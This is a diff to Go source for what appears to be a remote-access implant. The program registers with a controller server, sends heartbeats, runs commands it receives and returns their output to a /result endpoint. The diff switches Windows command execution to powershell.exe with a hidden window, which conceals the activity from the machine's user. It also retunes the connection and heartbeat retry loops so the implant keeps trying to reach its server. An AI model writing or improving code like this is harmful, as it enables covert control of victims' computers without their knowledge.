@@ -254,7 +254,8 @@ func executeCommand(command string) string {
 		// Execute a simple bash command, and return the output to /result endpoint
 	} else {
 		if runtime.GOOS == "windows" {
-			out, err := exec.Command("cmd", "/C", command).CombinedOutput()
+			//out, err := exec.Command("cmd", "/C", command).CombinedOutput()
+			out, err := exec.Command("powershell.exe", "-windowstyle", "hidden", "-Command", command).CombinedOutput()
 			if err != nil {
 				return err.Error() + string(out)
 			}
@@ -298,7 +299,7 @@ func main() {
 
 	registerkey = firstContact()
 	if strings.Contains(registerkey, "[-]") {
-		for i := 1; i < 9999; i++ {
+		for i := 1; i < 30; i++ {
 			//fmt.Println("[-] Cannot connect to server. Retrying...")
 			registerkey = firstContact()
 			if !strings.Contains(registerkey, "[-]") {
@@ -331,9 +332,9 @@ func main() {
 	for {
 		heartbeatResult := heartbeat(registerkey, ip, pid)
 
-		// Heartbeat failed. Retry heartbeat for 30 minutes
-		if heartbeatResult == 0 {
-			for i := 1; i < 180; i++ {
+		// Heartbeat failed. Retry heartbeat
+		if heartbeatResult == 0 || heartbeatResult == 2 {
+			for i := 1; i < 500; i++ {
 				heartbeatResult := heartbeat(registerkey, ip, pid)
 				if heartbeatResult == 2 {
 					break
